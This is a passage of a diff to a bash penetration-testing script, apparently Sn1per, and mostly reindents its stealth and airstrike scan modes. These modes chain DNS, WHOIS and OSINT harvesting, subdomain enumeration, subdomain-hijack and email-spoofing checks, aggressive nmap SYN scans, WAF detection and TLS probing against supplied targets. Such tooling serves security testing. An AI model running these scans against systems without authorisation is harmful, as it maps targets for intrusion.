-	echo -e "$OKRED           '\.   ./"
-	echo -e "$OKRED              '\/"
-	echo -e "$RESET"
-	echo -e "$OKORANGE + -- --=[Launching stealth scan: $TARGET $RESET"
-	echo -e "$OKGREEN $RESET"
-	echo -e "$OKGREEN + -- ----------------------------=[Running Nslookup]=------------------------ -- +$RESET"
-	nslookup $TARGET
-	host $TARGET
-	if [ $SCAN_TYPE == "DOMAIN" ];
-	then
-		echo -e "$OKGREEN + -- ----------------------------=[Gathering Whois Info]=-------------------- -- +$RESET"
-		whois $TARGET
-		echo -e "$OKGREEN + -- ----------------------------=[Gathering OSINT Info]=-------------------- -- +$RESET"
-		theharvester -d $TARGET -l 100 -b bing 2> /dev/null
-		echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Info]=---------------------- -- +$RESET"
-		dig -x $TARGET
-		dnsenum $TARGET
-		mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null
-		echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Subdomains]=---------------- -- +$RESET"
-		python $PLUGINS_DIR/Sublist3r/sublist3r.py -d $TARGET -vvv -o $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
-		dos2unix $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
-		echo ""
-		echo -e "$OKRED ╔═╗╦═╗╔╦╗╔═╗╦ ╦$RESET"
-		echo -e "$OKRED ║  ╠╦╝ ║ ╚═╗╠═╣$RESET"
-		echo -e "$OKRED ╚═╝╩╚═ ╩o╚═╝╩ ╩$RESET"
-		echo -e "$OKRED + -- ----------------------------=[Gathering Certificate Subdomains]=-------- -- +$RESET"
-		echo -e "$OKBLUE"
-		curl -s https://crt.sh/?q=%25.$TARGET > /tmp/curl.out && cat /tmp/curl.out | grep $TARGET | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u > $LOOT_DIR/domains/domains-$TARGET-crt.txt && cat $LOOT_DIR/domains/domains-$TARGET-crt.txt
-		echo -e "$OKRED [+] Domains saved to: $LOOT_DIR/domains/domains-$TARGET-full.txt"
-		cat $LOOT_DIR/domains/domains-$TARGET-crt.txt > /tmp/curl.out 2> /dev/null	
-		cat $LOOT_DIR/domains/domains-$TARGET.txt >> /tmp/curl.out 2> /dev/null	
-		sort -u /tmp/curl.out > $LOOT_DIR/domains/domains-$TARGET-full.txt
-		rm -f /tmp/curl.out 2> /dev/null	
-		echo -e "$RESET"
-		echo -e "$OKGREEN + -- ----------------------------=[Checking for Sub-Domain Hijacking]=------- -- +$RESET"
-		for a in `cat $LOOT_DIR/domains/domains-$TARGET.txt 2> /dev/null`; do dig $a CNAME | egrep -i "wordpress|instapage|heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot|cloudfront|modulus" 2>/dev/null; done;
-		echo -e "$OKGREEN + -- ----------------------------=[Checking Email Security]=----------------- -- +$RESET"
-		python $PLUGINS_DIR/SimpleEmailSpoofer/spoofcheck.py $TARGET 2>/dev/null
-	fi
-	echo ""
-	echo -e "$OKGREEN + -- ----------------------------=[Running TCP port scan]=------------------- -- +$RESET"
-	nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
-	
-	port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
-	port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
-	
-	if [ -z "$port_80" ];
-	then
-		echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
-	else
-		echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
-		echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
-		wafw00f http://$TARGET
-		echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
-		whatweb http://$TARGET
-		echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
-		xsstracer $TARGET 80
-		echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+  if [ "$OPT1" = "report" ]; then
+    sniper $TARGET $MODE | tee $LOOT_DIR/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+    exit
+  fi
+  echo -e "$OKRED                ____               $RESET"
+  echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
+  echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
+  echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
+  echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
+  echo -e "$OKRED               /_/                 $RESET"
+  echo -e "$RESET"
+  echo -e "$OKORANGE + -- --=[http://crowdshield.com"
+  echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3"
+  echo -e "$OKRED "
+  echo -e "$OKRED     ./\."
+  echo -e "$OKRED   ./    '\."
+  echo -e "$OKRED   \.       '\."
+  echo -e "$OKRED     '\.       '\."
+  echo -e "$OKRED        '\.       '\."
+  echo -e "$OKRED           '\.       '\."
+  echo -e "$OKRED           ./           '\."
+  echo -e "$OKRED         ./            ____'\."
+  echo -e "$OKRED       ./                  <  '\."
+  echo -e "$OKRED       \-------\            '>   '\."
+  echo -e "$OKRED         '\=====>        ___<       '\."
+  echo -e "$OKRED        ./-----/             __________'\."
+  echo -e "$OKRED "'       \.------\       _____   ___(_)(_\."\'
+  echo -e "$OKRED          '\=====>          <            ./'"
+  echo -e "$OKRED         ./-----/            '>        ./"
+  echo -e "$OKRED         \.               ___<       ./"
+  echo -e "$OKRED           '\.                     ./"
+  echo -e "$OKRED              '\.                ./"
+  echo -e "$OKRED                 '\.           ./"
+  echo -e "$OKRED                 ./          ./"
+  echo -e "$OKRED               ./          ./  Carl Pilcher"
+  echo -e "$OKRED             ./          ./"
+  echo -e "$OKRED           ./          ./"
+  echo -e "$OKRED         ./          ./"
+  echo -e "$OKRED         \.        ./"
+  echo -e "$OKRED           '\.   ./"
+  echo -e "$OKRED              '\/"
+  echo -e "$RESET"
+  echo -e "$OKORANGE + -- --=[Launching stealth scan: $TARGET $RESET"
+  echo -e "$OKGREEN $RESET"
+  echo -e "$OKGREEN + -- ----------------------------=[Running Nslookup]=------------------------ -- +$RESET"
+  nslookup $TARGET
+  host $TARGET
+  if [ $SCAN_TYPE == "DOMAIN" ];
+  then
+    echo -e "$OKGREEN + -- ----------------------------=[Gathering Whois Info]=-------------------- -- +$RESET"
+    whois $TARGET
+    echo -e "$OKGREEN + -- ----------------------------=[Gathering OSINT Info]=-------------------- -- +$RESET"
+    theharvester -d $TARGET -l 100 -b bing 2> /dev/null
+    echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Info]=---------------------- -- +$RESET"
+    dig -x $TARGET
+    dnsenum $TARGET
+    mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null
+    echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Subdomains]=---------------- -- +$RESET"
+    python $PLUGINS_DIR/Sublist3r/sublist3r.py -d $TARGET -vvv -o $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
+    dos2unix $LOOT_DIR/domains/domains-$TARGET.txt 2>/dev/null
+    echo ""
+    echo -e "$OKRED ╔═╗╦═╗╔╦╗╔═╗╦ ╦$RESET"
+    echo -e "$OKRED ║  ╠╦╝ ║ ╚═╗╠═╣$RESET"
+    echo -e "$OKRED ╚═╝╩╚═ ╩o╚═╝╩ ╩$RESET"
+    echo -e "$OKRED + -- ----------------------------=[Gathering Certificate Subdomains]=-------- -- +$RESET"
+    echo -e "$OKBLUE"
+    curl -s https://crt.sh/?q=%25.$TARGET > /tmp/curl.out && cat /tmp/curl.out | grep $TARGET | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u > $LOOT_DIR/domains/domains-$TARGET-crt.txt && cat $LOOT_DIR/domains/domains-$TARGET-crt.txt
+    echo -e "$OKRED [+] Domains saved to: $LOOT_DIR/domains/domains-$TARGET-full.txt"
+    cat $LOOT_DIR/domains/domains-$TARGET-crt.txt > /tmp/curl.out 2> /dev/null
+    cat $LOOT_DIR/domains/domains-$TARGET.txt >> /tmp/curl.out 2> /dev/null
+    sort -u /tmp/curl.out > $LOOT_DIR/domains/domains-$TARGET-full.txt
+    rm -f /tmp/curl.out 2> /dev/null
+    echo -e "$RESET"
+    echo -e "$OKGREEN + -- ----------------------------=[Checking for Sub-Domain Hijacking]=------- -- +$RESET"
+    for a in `cat $LOOT_DIR/domains/domains-$TARGET.txt 2> /dev/null`; do dig $a CNAME | egrep -i "wordpress|instapage|heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot|cloudfront|modulus" 2>/dev/null; done;
+    echo -e "$OKGREEN + -- ----------------------------=[Checking Email Security]=----------------- -- +$RESET"
+    python $PLUGINS_DIR/SimpleEmailSpoofer/spoofcheck.py $TARGET 2>/dev/null
+  fi
+  echo ""
+  echo -e "$OKGREEN + -- ----------------------------=[Running TCP port scan]=------------------- -- +$RESET"
+  nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+  
+  port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+  port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+  
+  if [ -z "$port_80" ];
+  then
+    echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
+  else
+    echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
+    echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+    wafw00f http://$TARGET
+    echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+    whatweb http://$TARGET
+    echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
+    xsstracer $TARGET 80
+    echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
     if [ ${DISTRO} == "blackarch"  ]; then
       /bin/CutyCapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg
     else
-		  cutycapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg
+      cutycapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg
     fi
-	fi
-	
-	if [ -z "$port_443" ];
-	then
-		echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
-	else
-		echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
-		echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
-		wafw00f https://$TARGET 
-		echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
-		whatweb https://$TARGET
-		echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
-		xsstracer $TARGET 443
-		echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
-		sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
-		sslscan --no-failed $TARGET
-		echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+  fi
+  
+  if [ -z "$port_443" ];
+  then
+    echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
+  else
+    echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
+    echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+    wafw00f https://$TARGET
+    echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+    whatweb https://$TARGET
+    echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
+    xsstracer $TARGET 443
+    echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
+    sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
+    sslscan --no-failed $TARGET
+    echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
     if [ ${DISTRO} == "blackarch"  ]; then
       /bin/CutyCapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg
     else
       cutycapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg
     fi
     echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/$TARGET-port443.jpg"
-	fi
-	
-	echo -e "$OKGREEN + -- ----------------------------=[Done]=------------------------------------ -- +$RESET"
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	echo -e ""
-	rm -f $INSTALL_DIR/.fuse_* 2> /dev/null
-	exit
+  fi
+  
+  echo -e "$OKGREEN + -- ----------------------------=[Done]=------------------------------------ -- +$RESET"
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  echo -e ""
+  rm -f $INSTALL_DIR/.fuse_* 2> /dev/null
+  exit
 fi
 
 if [ "$MODE" = "airstrike" ]; then
-	if [ "$OPT1" = "report" ]; then
-		sniper $TARGET $MODE | tee $LOOT_DIR/sniper-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
-		exit
-	fi
-	echo -e "$OKRED                ____               $RESET"
-	echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
-	echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
-	echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
-	echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
-	echo -e "$OKRED               /_/                 $RESET"
-	echo -e "$RESET"
-	echo -e "$OKORANGE + -- --=[http://crowdshield.com"
-	echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3"
-
-	for a in `cat $TARGET`;
-	do
-		echo -e "$OKRED                                         |"
-		echo -e "$OKRED                  |                      |"
-		echo -e "$OKRED                  |                    -/_\-"
-		echo -e "$OKRED                -/_\-   ______________(/ . \)______________"
-		echo -e "$OKRED   ____________(/ . \)_____________    \___/     <>"
-		echo -e "$OKRED   <>           \___/      <>    <>"
-		echo -e "$OKRED "
-		echo -e "$OKRED      ||"
-		echo -e "$OKRED      <>"
-		echo -e "$OKRED                            ||"
-		echo -e "$OKRED                            <>"
-		echo -e "$OKRED                                       ||"
-		echo -e "$OKRED                                       ||            BIG"
-		echo -e "$OKRED        _____               __         <>      (^)))^ BOOM!"
-		echo -e "$OKRED  BOOM!/((  )\       BOOM!((  )))            (     ( )"
-		echo -e "$OKRED ---- (__()__))          (() ) ))           (  (  (   )"
-		echo -e "$OKRED     ||  |||____|------    \  (/   ___     (__\     /__)"
-		echo -e "$OKRED      |__|||  |     |---|---|||___|   |___-----|||||"
-		echo -e "$OKRED  |  ||.  |   |       |     |||                |||||"
-		echo -e "$OKRED      |__|||  |     |---|---|||___|   |___-----|||||"
-		echo -e "$OKRED  |  ||.  |   |       |     |||                |||||"
-		echo -e "$OKRED __________________________________________________________"
-		echo -e "$OKRED Bomb raid (contributed by Michael aka SNOOPY@DRYCAS.CLUB.CC.CMU.EDU)"
-		echo -e "$RESET" 
-		echo -e "$OKORANGE + -- --=[Launching airstrike: $a $RESET"
-		echo -e "$OKGREEN + -- ----------------------------=[Running Nslookup]=------------------------ -- +$RESET"
-		nslookup $a
-		host $a
-		
-		if [[ ${a:0:1} =~ $REGEX ]]; 
-		then 
-			SCAN_TYPE="IP"
-		else 
-			SCAN_TYPE="DOMAIN"
-		fi
-		
-		if [ $SCAN_TYPE == "DOMAIN" ];
-		then
-			echo -e "$OKGREEN + -- ----------------------------=[Gathering Whois Info]=-------------------- -- +$RESET"
-			whois $a
-			echo -e "$OKGREEN + -- ----------------------------=[Gathering OSINT Info]=-------------------- -- +$RESET"
-			theharvester -d $a -l 100 -b bing 2> /dev/null
-			echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Info]=---------------------- -- +$RESET"
-			dig -x $a
-			dnsenum $a
-			mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null
-			echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Subdomains]=---------------- -- +$RESET"
-			python $PLUGINS_DIR/Sublist3r/sublist3r.py -d $a -vvv -o $LOOT_DIR/domains/domains-$a.txt 2>/dev/null
-			dos2unix $LOOT_DIR/domains/domains-$a.txt 2>/dev/null
-			echo ""
-			echo -e "$OKRED ╔═╗╦═╗╔╦╗╔═╗╦ ╦$RESET"
-			echo -e "$OKRED ║  ╠╦╝ ║ ╚═╗╠═╣$RESET"
-			echo -e "$OKRED ╚═╝╩╚═ ╩o╚═╝╩ ╩$RESET"
-			echo -e "$OKRED + -- ----------------------------=[Gathering Certificate Subdomains]=-------- -- +$RESET"
-			echo -e "$OKBLUE"
-			curl -s https://crt.sh/?q=%25.$a > /tmp/curl.out && cat /tmp/curl.out | grep $a | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u > $LOOT_DIR/domains/domains-$a-crt.txt && cat $LOOT_DIR/domains/domains-$a-crt.txt
-			echo -e "$OKRED [+] Domains saved to: $LOOT_DIR/domains/domains-$a-full.txt"
-			cat $LOOT_DIR/domains/domains-$a-crt.txt > /tmp/curl.out 2> /dev/null	
-			cat $LOOT_DIR/domains/domains-$a.txt >> /tmp/curl.out 2> /dev/null	
-			sort -u /tmp/curl.out > $LOOT_DIR/domains/domains-$a-full.txt
-			rm -f /tmp/curl.out 2> /dev/null	
-			echo -e "$RESET"
-			echo -e "$OKGREEN + -- ----------------------------=[Checking for Sub-Domain Hijacking]=------- -- +$RESET"
-			for b in `cat $LOOT_DIR/domains/domains-$a.txt 2> /dev/null`; do dig $b CNAME | egrep -i 'wordpress|instapage|heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot|cloudfront|modulus' 2>/dev/null; done;
-			echo -e "$OKGREEN + -- ----------------------------=[Checking Email Security]=----------------- -- +$RESET"
-			python $PLUGINS_DIR/SimpleEmailSpoofer/spoofcheck.py $a 2>/dev/null
-		fi
-		echo ""
-		echo -e "$OKGREEN + -- ----------------------------=[Running port scan]=------------------- -- +$RESET"
-		nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $a -oX $LOOT_DIR/nmap/nmap-$a.xml
-		
-		port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$a.xml | grep open`
-		port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$a.xml | grep open`
-		
-		if [ -z "$port_80" ];
-		then
-			echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
-		else
-			echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
-			echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
-			wafw00f http://$a 
-			echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
-			whatweb http://$a
-			echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
-			xsstracer $a 80
-			echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
-			if [ ${DISTRO} == "blackarch"  ]; then
+  if [ "$OPT1" = "report" ]; then
+    sniper $TARGET $MODE | tee $LOOT_DIR/sniper-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+    exit
+  fi
+  echo -e "$OKRED                ____               $RESET"
+  echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
+  echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
+  echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
+  echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
+  echo -e "$OKRED               /_/                 $RESET"
+  echo -e "$RESET"
+  echo -e "$OKORANGE + -- --=[http://crowdshield.com"
+  echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3"
+  
+  for a in `cat $TARGET`;
+  do
+    echo -e "$OKRED                                         |"
+    echo -e "$OKRED                  |                      |"
+    echo -e "$OKRED                  |                    -/_\-"
+    echo -e "$OKRED                -/_\-   ______________(/ . \)______________"
+    echo -e "$OKRED   ____________(/ . \)_____________    \___/     <>"
+    echo -e "$OKRED   <>           \___/      <>    <>"
+    echo -e "$OKRED "
+    echo -e "$OKRED      ||"
+    echo -e "$OKRED      <>"
+    echo -e "$OKRED                            ||"
+    echo -e "$OKRED                            <>"
+    echo -e "$OKRED                                       ||"
+    echo -e "$OKRED                                       ||            BIG"
+    echo -e "$OKRED        _____               __         <>      (^)))^ BOOM!"
+    echo -e "$OKRED  BOOM!/((  )\       BOOM!((  )))            (     ( )"
+    echo -e "$OKRED ---- (__()__))          (() ) ))           (  (  (   )"
+    echo -e "$OKRED     ||  |||____|------    \  (/   ___     (__\     /__)"
+    echo -e "$OKRED      |__|||  |     |---|---|||___|   |___-----|||||"
+    echo -e "$OKRED  |  ||.  |   |       |     |||                |||||"
+    echo -e "$OKRED      |__|||  |     |---|---|||___|   |___-----|||||"
+    echo -e "$OKRED  |  ||.  |   |       |     |||                |||||"
+    echo -e "$OKRED __________________________________________________________"
+    echo -e "$OKRED Bomb raid (contributed by Michael aka SNOOPY@DRYCAS.CLUB.CC.CMU.EDU)"
+    echo -e "$RESET"
+    echo -e "$OKORANGE + -- --=[Launching airstrike: $a $RESET"
+    echo -e "$OKGREEN + -- ----------------------------=[Running Nslookup]=------------------------ -- +$RESET"
+    nslookup $a
+    host $a
+    
+    if [[ ${a:0:1} =~ $REGEX ]];
+    then
+      SCAN_TYPE="IP"
+    else
+      SCAN_TYPE="DOMAIN"
+    fi
+    
+    if [ $SCAN_TYPE == "DOMAIN" ];
+    then
+      echo -e "$OKGREEN + -- ----------------------------=[Gathering Whois Info]=-------------------- -- +$RESET"
+      whois $a
+      echo -e "$OKGREEN + -- ----------------------------=[Gathering OSINT Info]=-------------------- -- +$RESET"
+      theharvester -d $a -l 100 -b bing 2> /dev/null
+      echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Info]=---------------------- -- +$RESET"
+      dig -x $a
+      dnsenum $a
+      mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null
+      echo -e "$OKGREEN + -- ----------------------------=[Gathering DNS Subdomains]=---------------- -- +$RESET"
+      python $PLUGINS_DIR/Sublist3r/sublist3r.py -d $a -vvv -o $LOOT_DIR/domains/domains-$a.txt 2>/dev/null
+      dos2unix $LOOT_DIR/domains/domains-$a.txt 2>/dev/null
+      echo ""
+      echo -e "$OKRED ╔═╗╦═╗╔╦╗╔═╗╦ ╦$RESET"
+      echo -e "$OKRED ║  ╠╦╝ ║ ╚═╗╠═╣$RESET"
+      echo -e "$OKRED ╚═╝╩╚═ ╩o╚═╝╩ ╩$RESET"
+      echo -e "$OKRED + -- ----------------------------=[Gathering Certificate Subdomains]=-------- -- +$RESET"
+      echo -e "$OKBLUE"
+      curl -s https://crt.sh/?q=%25.$a > /tmp/curl.out && cat /tmp/curl.out | grep $a | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u > $LOOT_DIR/domains/domains-$a-crt.txt && cat $LOOT_DIR/domains/domains-$a-crt.txt
+      echo -e "$OKRED [+] Domains saved to: $LOOT_DIR/domains/domains-$a-full.txt"
+      cat $LOOT_DIR/domains/domains-$a-crt.txt > /tmp/curl.out 2> /dev/null
+      cat $LOOT_DIR/domains/domains-$a.txt >> /tmp/curl.out 2> /dev/null
+      sort -u /tmp/curl.out > $LOOT_DIR/domains/domains-$a-full.txt
+      rm -f /tmp/curl.out 2> /dev/null
+      echo -e "$RESET"
+      echo -e "$OKGREEN + -- ----------------------------=[Checking for Sub-Domain Hijacking]=------- -- +$RESET"
+      for b in `cat $LOOT_DIR/domains/domains-$a.txt 2> /dev/null`; do dig $b CNAME | egrep -i 'wordpress|instapage|heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot|cloudfront|modulus' 2>/dev/null; done;
+      echo -e "$OKGREEN + -- ----------------------------=[Checking Email Security]=----------------- -- +$RESET"
+      python $PLUGINS_DIR/SimpleEmailSpoofer/spoofcheck.py $a 2>/dev/null
+    fi
+    echo ""
+    echo -e "$OKGREEN + -- ----------------------------=[Running port scan]=------------------- -- +$RESET"
+    nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $a -oX $LOOT_DIR/nmap/nmap-$a.xml
+    
+    port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$a.xml | grep open`
+    port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$a.xml | grep open`
+    
+    if [ -z "$port_80" ];
+    then
+      echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
+    else
+      echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
+      echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+      wafw00f http://$a
+      echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+      whatweb http://$a
+      echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
+      xsstracer $a 80
+      echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+      if [ ${DISTRO} == "blackarch"  ]; then
         /bin/CutyCapt --url=http://$a --out=$LOOT_DIR/screenshots/$a-port80.jpg
       else
         cutycapt --url=http://$a --out=$LOOT_DIR/screenshots/$a-port80.jpg
       fi
-		fi
-		
-		if [ -z "$port_443" ];
-		then
-			echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
-		else
-			echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
-			echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
-			wafw00f https://$a 
-			echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
-			whatweb https://$a
-			echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
-			xsstracer $a 443
-			echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
-			sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $a
-			sslscan --no-failed $a
-			echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
-			if [ ${DISTRO} == "blackarch"  ]; then
+    fi
+    
+    if [ -z "$port_443" ];
+    then
+      echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
+    else
+      echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
+      echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+      wafw00f https://$a
+      echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+      whatweb https://$a
+      echo -e "$OKGREEN + -- ----------------------------=[Checking Headers and Methods]=------------ -- +$RESET"
+      xsstracer $a 443
+      echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
+      sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $a
+      sslscan --no-failed $a
+      echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+      if [ ${DISTRO} == "blackarch"  ]; then
         /bin/CutyCapt --url=https://$a --out=$LOOT_DIR/screenshots/$a-port443.jpg
       else
         cutycapt --url=https://$a --out=$LOOT_DIR/screenshots/$a-port443.jpg
       fi
       echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$a-port443.jpg"
-		fi
-		
-		echo -e "$OKGREEN + -- ----------------------------=[Done!]=----------------------------------- -- +$RESET"
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-		echo -e ""
-	done;
-	exit
+    fi
+    
+    echo -e "$OKGREEN + -- ----------------------------=[Done!]=----------------------------------- -- +$RESET"
+    echo -e ""
+    echo -e ""
+    echo -e ""
+    echo -e ""
+    echo -e ""
+    echo -e ""
+    echo -e ""
+    echo -e ""
+    echo -e ""
+    echo -e ""
+    echo -e ""
+    echo -e ""
+    echo -e ""
